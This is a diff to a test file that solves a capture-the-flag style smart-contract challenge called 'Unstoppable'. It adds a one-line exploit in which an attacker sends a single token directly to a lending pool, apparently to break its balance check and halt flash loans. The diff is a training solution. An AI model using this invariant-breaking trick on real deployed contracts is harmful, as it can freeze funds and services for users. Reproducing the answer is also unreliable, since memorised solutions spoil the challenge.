@@ -1,4 +1,4 @@
-const { ethers } = require('hardhat');
+const { ethers } = require("hardhat");
 const { expect } = require('chai');
 
 describe('[Challenge] Unstoppable', function () {
@@ -40,6 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
